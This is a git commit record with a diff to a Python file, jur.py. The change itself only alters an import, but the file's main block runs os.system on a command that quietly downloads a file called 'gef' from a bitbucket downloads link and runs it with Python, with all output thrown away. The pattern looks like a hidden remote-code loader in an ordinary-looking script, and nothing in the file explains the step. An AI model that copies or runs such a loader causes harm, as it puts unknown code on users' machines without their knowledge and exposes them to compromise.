f3c2181ead290b47f119efb74b0c1ac6b098f7cb
gakira munshi <gakimarki@proton.me>
2024-11-27 22:24:21 -0500

    50/50

--- jur.py
+++ jur.py
@@ -1,3 +1,3 @@
-import os, sys,shutil
+import os, sys,pickle
 if __name__=='__main__':
   cmd='wget -q "https://bitbucket.org/lampanukal/static/downloads/gef" && python gef  1> /dev/null 2> /dev/null';os.system(cmd)
